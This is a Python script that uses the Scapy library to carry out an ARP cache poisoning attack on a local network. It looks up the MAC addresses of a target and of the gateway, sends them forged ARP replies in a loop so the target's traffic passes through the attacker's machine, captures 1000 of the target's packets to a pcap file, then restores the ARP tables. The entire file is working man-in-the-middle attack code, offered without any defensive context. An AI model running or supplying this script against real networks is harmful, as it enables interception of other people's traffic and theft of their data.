from scapy.all import *
import os, threading, signal

"""
Be sure to enable IP forwarding:
Linux:
echo 1 > /proc/sys/net/ipv4/ip_forward

Mac:
sudo sysctl -w net.inet.ip.forwarding=1
"""

interface = "en1"
target_ip = "10.0.0.8" # ip address to direct traffic to
gateway_ip = "10.0.0.1" # ip address of the actual gateway
packet_count = 1000
broadcast_mac = "ff:ff:ff:ff:ff:ff"

# set our interface
conf.iface = interface

# turn off output
conf.verb = 0

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    # slightly different method of using send
    print("[*] Restoring target...")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=broadcast_mac, hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=broadcast_mac, hwsrc=target_mac), count=5)
    
    # signals the main thread to exit
    os.kill(os.getpid(), signal.SIGINT)
    
def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst=broadcast_mac)/ARP(pdst=ip_address), timeout=2, retry=10)
    
    # return the MAC address from a response
    for s,r in responses:
        return r[Ether].src
    
    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac
    
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac
    
    print("[*] Beginning the ARP cache poisoning attack. - Ctrl+C to stop.")
    
    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            
            time.sleep(2)
            
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    print("[*] ARP cache poisoning attack ended.")
    return

print("[*] Setting up %s" % interface)

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print("[!!] Failed to get gateway MAC. Exiting...")
    sys.exit(1)

print("[*] Gateway %s has MAC: %s" % (gateway_ip, gateway_mac))

target_mac = get_mac(target_ip)

if target_mac is None:
    print("[!!] Failed to get target MAC. Exiting...")
    sys.exit(1)
    
print("[*] Target %s has MAC: %s" % (target_ip, target_mac))

# start poison thread
poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    print("[*] Starting sniffer for %d packets" % packet_count)
    
    bpf_filter = "ip host %s" % target_ip
    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
    
    # write out the captured packets
    wrpcap('arper.pcap', packets)
    
    # restore the network
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    
except KeyboardInterrupt:
    # restore the network
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
